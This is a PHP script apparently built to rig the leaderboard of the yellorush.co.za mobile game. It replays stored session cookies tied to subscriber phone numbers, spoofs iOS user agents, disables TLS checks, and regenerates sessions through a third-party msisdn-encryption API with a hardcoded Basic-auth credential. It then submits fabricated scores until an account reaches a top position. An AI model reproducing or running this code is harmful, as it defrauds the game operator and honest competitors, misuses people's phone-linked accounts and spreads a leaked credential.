<?php
date_default_timezone_set('Africa/Johannesburg');

// Load game configuration
require_once('game-config.php');

function parse_cookiejar($path){
    $out = [];
    if (!file_exists($path)) return $out;
    $fh = fopen($path, 'r');
    if (!$fh) return $out;
    while (($ln = fgets($fh)) !== false){
        $ln = rtrim($ln, "\r\n");
        if ($ln === '') continue;
        if (strpos($ln, '#HttpOnly_') === 0) { $ln = substr($ln, 1); }
        elseif ($ln[0] === '#') { continue; }
        $cols = explode("\t", $ln);
        if (count($cols) < 7) { $cols = preg_split('/\s+/', $ln); }
        if (count($cols) >= 7){
            $name = $cols[count($cols)-2];
            $value = $cols[count($cols)-1];
            $out[$name] = $value;
        }
    }
    fclose($fh);
    return $out;
}

function normalize_msisdn($input){
    $digits = preg_replace('/\D+/', '', $input ?? '');
    if (preg_match('/^0\d{9}$/', $digits)) return '27' . substr($digits, 1);
    if (preg_match('/^27\d{9}$/', $digits)) return $digits;
    if (preg_match('/^\d{9}$/', $digits)) return '27' . $digits;
    return null;
}

function extract_csrf_token($html){
    if (preg_match('/name=\"_token\"\s+value=\"([^\"]+)\"/i', $html, $m)) {
        return trim($m[1]);
    }
    return '';
}

// Attempt to get play session (redirect + params)
function fetchPlaySession($cookie, $uA) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://yellorush.co.za/play-now');
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: en-US,en;q=0.9',
        'Cache-Control: no-cache',
        'Connection: keep-alive',
        'Cookie: '.$cookie,
        'Pragma: no-cache',
        'Host: www.yellorush.co.za',
        'Referer: https://yellorush.co.za/',
        'Sec-CH-UA: "Safari";v="15", "AppleWebKit";v="605"',
        'Sec-CH-UA-Mobile: ?1',
        'Sec-CH-UA-Platform: "iOS"',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: '.$uA
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $response = curl_exec($ch);
    $redirectedUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);

    $query_str = parse_url($redirectedUrl, PHP_URL_QUERY);
    parse_str($query_str, $query_params);

    return [
        'url'       => $redirectedUrl,
        'unique_id' => $query_params['unique_id'] ?? '',
        'game_id'   => $query_params['game_id']   ?? '',
        'sigv1'     => $query_params['sigv1']     ?? '',
    ];
}

// Fallback: Refresh cookie using phone → e-msisdn flow
// COPIED EXACTLY FROM YOUR WORKING STAGING SCRIPT
function refreshCookieViaPhone($currentCookie, $uA) {
    $cookieFilePath = __DIR__ . '/new/data/cookies-mtn.json';

    if (!file_exists($cookieFilePath)) {
        echo "\nCookie file not found: $cookieFilePath";
        return null;
    }

    $list = json_decode(file_get_contents($cookieFilePath), true);
    if (!is_array($list)) {
        echo "\nInvalid JSON in cookie file";
        return null;
    }

    $matchIndex = null;
    $entry = null;
    foreach ($list as $idx => $row) {
        $stored = $row['cookie'] ?? ($row['value'] ?? '');
        if (trim($stored) === trim($currentCookie)) {
            $matchIndex = $idx;
            $entry = $row;
            break;
        }
    }

    if (!$entry || empty($entry['phone'])) {
        echo "\nNo matching entry or phone missing.";
        return null;
    }

    $phoneRaw = $entry['phone'];
    $phone = normalize_msisdn($phoneRaw);
    if (!$phone) {
        echo "\nInvalid phone format: $phoneRaw";
        return null;
    }

    echo "\n[Fallback] Using phone: $phone ...\n";

    // encrypt-msisdn
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'https://dep.penroseza.com/encrypt-msisdn/v2',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_HTTPHEADER     => [
            'Authorization: Basic UGVucm9zZV9HYW1pbmc6Qm83c2pIeVQ4MGdB',
            'Content-Type: application/json',
            'Origin: https://voucher-store.yellowrush.co.za',
            'Referer: https://voucher-store.yellowrush.co.za/',
            'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        ],
        CURLOPT_POSTFIELDS     => json_encode(['msisdn' => $phone]),
    ]);

    echo $encResp = curl_exec($ch);
    $encCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($encCode !== 200 || empty($encResp)) {
        echo "\nencrypt-msisdn failed (HTTP $encCode)";
        return null;
    }

    $encData = json_decode($encResp, true);
    $eMsisdn = $encData['e-msisdn'] ?? '';
    if (empty($eMsisdn) || strlen($eMsisdn) < 200) {
        echo "\nNo valid e-msisdn received";
        return null;
    }

    // GET ?e-msisdn - using staging-style restoration (headers + implode)
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'https://www.yellorush.co.za/?e-msisdn=' .$eMsisdn,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'User-Agent: ' . $uA,
            'Upgrade-Insecure-Requests: 1',
        ],
    ]);

    $loginResp   = curl_exec($ch);
    $finalUrl    = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    $headerSize  = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headersPart = substr($loginResp, 0, $headerSize);
    curl_close($ch);

    // Extract Set-Cookie lines (staging way)
    preg_match_all('/Set-Cookie:\s*([^\r\n]+)/i', $headersPart, $cookieMatches);
    $newCookieParts = $cookieMatches[1] ?? [];

    if (empty($newCookieParts)) {
        echo "\nNo Set-Cookie headers found in login response\n";
        return null;
    }

    $newCookie = implode('; ', array_map('trim', $newCookieParts));
    echo "\nNew cookie acquired (length: " . strlen($newCookie) . ")\n";

    // Update json file
    $list[$matchIndex]['cookie'] = $newCookie;

    if (file_put_contents($cookieFilePath, json_encode($list, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES)) === false) {
        echo "\nFailed to save updated cookie file!";
        return null;
    }

    echo "\nCookie refreshed and saved.";
    return $newCookie;
}

require_once('Tools-mtn-v2.php');
system('clear');

$uA = RandomUa();
$scoreTarget = TargetScore();
$number3 = GetTargetScore(1);

$cookie = isset($_GET['c']) ? trim($_GET['c']) : '';
if (empty($cookie)) die("\nNo cookie (?c=...)\n");

$pos = GetPosition($cookie);
$b4Score = GetTargetScore($pos);

echo "\nScore at pos 1: $number3 | Our pos: $pos\n";

$playData = fetchPlaySession($cookie, $uA);
$redirectedUrl = $playData['url'];
$unique_id     = $playData['unique_id'];
$game_id       = $playData['game_id'];
$sigv1         = $playData['sigv1'];

if (empty($unique_id)) {
    echo "\nNo unique_id → fallback...\n";
    $refreshed = refreshCookieViaPhone($cookie, $uA);
    if ($refreshed) {
        $cookie = $refreshed;
        $playData = fetchPlaySession($cookie, $uA);
        $redirectedUrl = $playData['url'];
        $unique_id     = $playData['unique_id'];
        $game_id       = $playData['game_id'];
        $sigv1         = $playData['sigv1'];
    }
    if (empty($unique_id)) die("\nStill invalid after refresh.\n");
}

// Load numbers from config based on game
$gameSlug = extractGameSlug($redirectedUrl);
$config   = getGameConfig($gameSlug);
$gameScore = $config['gameScore'];
$max       = $config['max'];
$step      = $config['step'];
$count     = $config['count'];

echo "\n[Game: $gameSlug] using max=$max, gameScore=$gameScore, step=$step, count=$count\n";

// Your original logic for adjusting max and generating scores

  $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://yellorush.co.za/new-game-check-user-status/'.$unique_id.'/'.$sigv1.'');
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        $headers = array(
            'Host: www.yellorush.co.za',
            'Referer:'.$redirectedUrl,
            'Sec-CH-UA: \"Safari\";v=\"15\", \"AppleWebKit\";v=\"605\"',
            'Sec-CH-UA-Mobile: ?1',
            'Sec-CH-UA-Platform: \"iOS\"',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Site: same-origin',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: '.$uA,
        );
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);

        $curl = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($curl, 0, $header_size);
        $body = substr($curl, $header_size);
        curl_close($ch);

        
        
        $x_power = X_Power($header);
        echo "\n<br> X-Powered-Version: $x_power\n";



// Adjustable score range for leaderboard placement
$scoreStart = 49679; // lowest score to consider
$scoreEnd   = 49690; // highest score to consider

// Skip if this cookie already holds a top 10 position
// Refresh position to ensure it's up to date
$pos = GetPosition($cookie);
if ($pos > 0 && $pos <= 1) {
    echo "\nAlready in top 10 at position $pos, skipping request.";
  sleep(rand(120,340));
    exit;
}

$success = false;
$currentScore = null;



if($number3>$max){
 $max = $number3;
}
// calculate minimum based on max, step, and count
$min = $max - ($count - 1) * $step;

$scores = range($max, $min, -$step); 
shuffle($scores);
foreach ($scores as $score) {

 if (isScoreInTop10($score)) {
    echo "Already in use $score\n";
   continue;
} 

    echo "\nTrying score => $score\n";
    $increment = 1;
    $uA = RandomUa();
    $memory = validate_request($x_power, $score);
    $x_power = generateRandomDivisionData($score, $redirectedUrl, $x_power, $memory, $increment, $uA,$gameScore);
    $pos = GetPosition($cookie);
    $currentScore = GetTargetScore($pos);
    echo "\nLeaderboard value: $currentScore at pos $pos";
    if ($currentScore !== $b4Score && $pos > 0 && $pos <= 6) {
        $success = true;
        break;
    }
    echo "\nScore $score failed to update.";
 
}

if ($success) {
    echo "\nLeaderboard updated with score: $currentScore";
} else {
    echo "\nFailed to update leaderboard";
}
